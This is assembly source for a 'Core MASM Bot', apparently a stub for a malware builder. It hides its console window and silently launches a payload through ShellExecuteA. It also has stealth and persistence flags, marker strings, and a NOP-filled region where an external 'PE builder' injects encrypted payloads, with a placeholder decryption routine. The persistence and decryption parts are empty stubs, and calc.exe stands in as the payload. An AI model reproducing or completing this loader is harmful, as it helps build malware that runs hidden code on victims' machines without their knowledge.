# ===============================================================================
# CORE MASM BOT - GNU ASSEMBLER VERSION
# Converted from MASM to GNU AS syntax for MinGW compatibility
# ===============================================================================

.intel_syntax noprefix
.text

# ===============================================================================
# GLOBAL SYMBOLS AND IMPORTS
# ===============================================================================
.extern GetConsoleWindow
.extern ShowWindow
.extern ShellExecuteA
.extern Sleep
.extern ExitProcess

.global _start

# ===============================================================================
# DATA SECTION
# ===============================================================================
.section .data

# Core payload identifier (used by PE builder to locate injection point)
payload_marker_start:
    .ascii "PAYLOAD_START_MARKER_DEADBEEF\0"

# Default payload (calc.exe launcher)
default_payload:
    .ascii "calc.exe\0"

# Core functionality flags
stealth_mode:
    .long 1                    # Enable stealth operations

persistence_mode:
    .long 1                    # Enable persistence

payload_encrypted:
    .long 0                    # Set by PE builder if payload is encrypted

# Payload marker end
payload_marker_end:
    .ascii "PAYLOAD_END_MARKER_CAFEBABE\0"

# ===============================================================================
# MAIN ENTRY POINT
# ===============================================================================
.section .text

_start:
    # Core initialization
    call core_init
    
    # Check if we're running in stealth mode
    mov eax, DWORD PTR stealth_mode
    cmp eax, 1
    je stealth_execution
    
    # Normal execution path
    call normal_execution
    jmp exit_cleanly
    
stealth_execution:
    # Stealth execution path
    call stealth_init
    call execute_payload_stealthily
    call cleanup_stealth
    jmp exit_cleanly

exit_cleanly:
    # Clean exit
    push 0
    call ExitProcess

# ===============================================================================
# CORE INITIALIZATION
# ===============================================================================
core_init:
    # Basic initialization that always happens
    
    # Check if payload is encrypted (PE builder sets this flag)
    mov eax, DWORD PTR payload_encrypted
    cmp eax, 1
    je decrypt_payload
    
    # Payload is not encrypted, continue normally
    jmp init_complete
    
decrypt_payload:
    # Call decryption routine (implemented by PE builder)
    call decrypt_embedded_payload
    
init_complete:
    ret

# ===============================================================================
# STEALTH INITIALIZATION
# ===============================================================================
stealth_init:
    # Minimal stealth setup
    
    # Hide console window if we have one
    call GetConsoleWindow
    test eax, eax
    jz no_console
    
    sub esp, 8                      # Align stack for x64
    push 0                          # SW_HIDE
    push eax                        # console window handle
    call ShowWindow
    add esp, 16                     # Clean up stack
    
no_console:
    ret

# ===============================================================================
# NORMAL EXECUTION
# ===============================================================================
normal_execution:
    # Execute payload normally (visible)
    
    push 1                          # SW_SHOWNORMAL
    push 0                          # lpDirectory
    push 0                          # lpParameters  
    lea eax, default_payload
    push eax                        # lpFile
    push 0                          # lpOperation
    push 0                          # hwnd
    call ShellExecuteA
    
    ret

# ===============================================================================
# STEALTH EXECUTION
# ===============================================================================
execute_payload_stealthily:
    # Execute payload in stealth mode
    
    push 0                          # SW_HIDE
    push 0                          # lpDirectory
    push 0                          # lpParameters
    lea eax, default_payload
    push eax                        # lpFile
    push 0                          # lpOperation  
    push 0                          # hwnd
    call ShellExecuteA
    
    ret

# ===============================================================================
# STEALTH CLEANUP
# ===============================================================================
cleanup_stealth:
    # Clean up any stealth artifacts
    
    # Wait a bit before exiting
    push 2000                       # 2 seconds
    call Sleep
    
    ret

# ===============================================================================
# DECRYPTION STUB (IMPLEMENTED BY PE BUILDER)
# ===============================================================================
decrypt_embedded_payload:
    # This is a stub - the PE builder will implement the actual decryption
    # based on which encryption layers were applied
    
    # For now, just return (no decryption needed)
    ret

# ===============================================================================
# PAYLOAD INJECTION POINT MARKERS
# ===============================================================================
# These markers help the PE builder locate where to inject encrypted payloads

.section .data

injection_point_start:
    .ascii "INJECTION_POINT_START_12345678\0"
    .space 1000, 0x90               # 1KB of NOPs for payload injection

injection_point_end:
    .ascii "INJECTION_POINT_END_87654321\0"

# ===============================================================================
# PERSISTENCE ROUTINES (OPTIONAL)
# ===============================================================================
.section .text

install_persistence:
    # Minimal persistence installation
    # Only called if persistence_mode = 1
    
    mov eax, DWORD PTR persistence_mode
    cmp eax, 1
    jne no_persistence
    
    # Add to startup (basic method)
    # The PE builder can enhance this with more advanced techniques
    
no_persistence:
    ret